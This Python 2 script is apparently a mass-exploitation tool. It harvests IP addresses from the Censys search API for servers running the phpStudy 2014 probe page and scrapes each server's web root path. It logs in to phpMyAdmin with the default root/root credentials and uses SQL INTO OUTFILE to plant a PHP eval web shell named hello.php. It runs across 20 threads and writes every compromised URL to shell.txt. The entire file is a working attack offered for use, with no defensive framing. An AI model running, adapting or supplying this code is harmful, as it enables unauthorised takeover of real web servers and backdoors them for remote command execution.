# coding=utf-8
import urllib2
import urllib
import re
import cookielib
import sys
from Queue import Queue
import threading
import json
import requests
import time

API_URL = "https://www.censys.io/api/v1"
UID = "YOUR UID"
SECRET = "YOUR SECRET"
PAGES = 50
cur_page = 1
thread_num = 20
over_num = 0
queue = Queue()
ip_OK = open("shell.txt", "w")

class testTarget(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        global queue
        global ip_OK
        global over_num
        global thread_num
        is_over = False
        while not is_over:
            for i in range(5):
                if not queue.empty():
                    url = queue.get()
                else:
                    is_over = True
                    over_num += 1
                    if over_num == thread_num:
                        ip_OK.close()
                        sys.exit()
                    break
                if shell(url):
                    print "%s is vul" % url
                    ip_OK.write("%s/hello.php\n" % url)
                    ip_OK.flush()
                else:
                    print "%s is not vul" % url
            time.sleep(1)

def shell(url):
    try:
        php_page = urllib2.urlopen(url)
        php_html=php_page.read()
        path_search = re.compile(r'<td>绝对路径</td>[\s\S]*?<td>(.*?)</td>')
        path_group = path_search.search(php_html)
        if path_group:
            path = path_group.group(1)
        else:
            return False
    except:
        return False

    cookies = cookielib.LWPCookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookies))
    headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
    params = urllib.urlencode({'pma_username': 'root', 'pma_password': 'root'})
    request = urllib2.Request(url+"/phpmyadmin/index.php", params,headers)
    try:
        response = opener.open(request)
    except:
        return False

    if response:
        try:
            a = response.read()
        except:
            return False
        
        pattern = re.compile(r'<p>phpMyAdmin is more friendly with a')
        judge = pattern.search(a)
        if judge != None:
            token_find = re.compile(r"token = '(.*?)';")
            token_group = token_find.search(a)
            token = token_group.group(1)

            if path:
                path = path+'/hello.php'
                sql = ["Drop TABLE IF EXISTS someone;","Create TABLE someone(cmd text NOT NULL);","Insert INTO someone (cmd) VALUES('<?php @eval($_POST[123])?>');","Select cmd from someone into outfile '"+path+"';","Drop TABLE IF EXISTS someone;"]
                exp_headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
                success_num = 0
                for sql_cmd in sql:
                    exp = urllib.urlencode({'is_js_confirmed':'1', 'db':'test', 'token':token, 'sql_query':sql_cmd,'ajax_request':'true'})
                    exp_request = urllib2.Request(url+"/phpmyadmin/import.php", exp, exp_headers)
                    try:
                        exp_response = opener.open(exp_request)
                    except:
                        return False

                try:
                    res = urllib2.urlopen(url+'/hello.php')
                except urllib2.HTTPError,e:
                    if e.code==404:
                        return False
                else:
                    return True

def getIp(page):
    data = {
        "query":"80.http.get.title:'phpStudy 探针 2014'",
        "page":page,
        "fields":["ip"]
    }
    try:
        res = requests.post(API_URL + "/search/ipv4", data=json.dumps(data), auth=(UID, SECRET))
    except:
        pass
    else:
        try:
            results = res.json()
        except:
            print results
            pass
        else:
            if res.status_code != 200:
                print "error occurred: %s" % results["error"]
                sys.exit(1)
            else:
                result_iter = iter(results["results"])
                for result in result_iter:
                    queue.put("http://%s" % result["ip"])

def test():
    for i in range(thread_num):
        t = testTarget()
        t.start()

if __name__ == '__main__':
    getIp(cur_page)
    if not queue.empty():
        test()
    while queue.qsize() > 0:
        if cur_page <= PAGES:
            getIp(cur_page)
            cur_page += 1
        time.sleep(0.1)